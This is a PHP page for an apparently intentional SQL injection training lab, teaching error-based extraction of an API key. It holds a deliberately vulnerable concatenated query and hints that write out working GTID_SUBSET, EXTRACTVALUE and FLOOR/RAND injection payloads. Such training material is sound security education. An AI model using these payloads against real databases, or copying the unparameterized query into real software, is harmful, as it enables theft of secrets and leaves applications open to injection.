<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   API KEY VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT api_key FROM api_keys WHERE service_name='internal' LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['api_key']) {
        $_SESSION['mysql_lab8_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab8", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 8. Error-Based: GTID_SUBSET / JSON Functions</h3>

    <h4>Scenario</h4>
    <p>
        A messaging inbox shows the <strong>unread message count</strong> for a given
        recipient. The page displays <strong>&ldquo;You have N unread messages&rdquo;</strong>
        but never shows message content. A secret <code>api_keys</code> table holds
        an internal API key. MySQL errors are shown on the page.
    </p>

    <h4>Objective</h4>
    <p>
        Use <strong>GTID_SUBSET()</strong> (MySQL 5.7+), <strong>JSON_KEYS()</strong>,
        or other error-leaking functions to extract the <strong>internal API key</strong>
        from the <code>api_keys</code> table. On MariaDB, these MySQL-specific functions
        may not be available: use <strong>EXTRACTVALUE()</strong> or
        <strong>FLOOR/RAND/GROUP BY</strong> as reliable alternatives.
        Submit the API key below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try a single quote <code>'</code> in the recipient field: does it trigger an error?<br>
        2. MySQL 5.7+ has <code>GTID_SUBSET()</code> that throws errors with our data embedded.<br>
        3. Try: <code>' AND GTID_SUBSET(CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal')), 1) -- -</code><br>
        4. If GTID_SUBSET is not available (MariaDB), use EXTRACTVALUE:<br>
           <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT api_key FROM api_keys WHERE service_name='internal'))) -- -</code><br>
        5. Or FLOOR/RAND double-query:<br>
           <code>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT api_key FROM api_keys WHERE service_name='internal'), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit API Key</h4>
    <form method="POST" class="form-row">
        <input type="text" name="admin_password" class="input" placeholder="Enter the internal API key..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab8_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the internal API key using error-based SQL injection with advanced MySQL error functions.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Message Inbox</h4>
    <form method="POST" class="form-row">
<input type="text" name="user" class="input" placeholder="Enter recipient (try: bob)" value="<?= htmlspecialchars($_POST['user'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Check Inbox</button>
    </form>
</div>

<?php
if (isset($_POST['user'])) {
    $user = $_POST['user'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT COUNT(*) AS unread FROM messages WHERE recipient = '$user' AND read_status = 0";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MySQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mysql&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute: error-based: only show unread count, NOT actual messages
    try {
        $result = mysqli_query($conn, $query);

        if ($result) {
            $row = mysqli_fetch_assoc($result);
            $count = $row['unread'] ?? 0;
            if ($count > 0) {
                echo '<div class="result-success result-box"><strong>You have ' . htmlspecialchars($count) . ' unread message(s)</strong>.</div>';
            } else {
                echo '<div class="result-warning result-box">No unread messages for &ldquo;' . htmlspecialchars($user) . '&rdquo;.</div>';
            }
        }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MySQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
